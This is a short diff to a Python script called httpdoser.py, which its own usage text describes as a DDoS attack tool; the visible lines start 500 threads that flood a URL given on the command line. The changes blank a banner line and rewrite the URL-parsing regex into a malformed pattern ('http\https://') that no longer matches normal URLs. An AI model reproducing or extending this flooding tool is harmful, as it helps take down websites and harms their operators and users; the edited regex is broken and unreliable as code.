@@ -59,7 +59,7 @@ def buildblock(size):
 	return(out_str)
 
 def usage():
-	print '---------------------------------------------------'
+	print 
 	print 'USAGE: python httpdoser.py <url>'
 	print 'httpdoser website : DDoS Attack'
 	print "\a"
@@ -162,7 +162,7 @@ else:
 		url = sys.argv[1]
 		if url.count("/")==2:
 			url = url + "/"
-		m = re.search('http\://([^/]*)/?.*', url)
+		m = re.search('http\https://([^/]*)/?.*', url)
 		host = m.group(1)
 		for i in range(500):
 			t = HTTPThread()
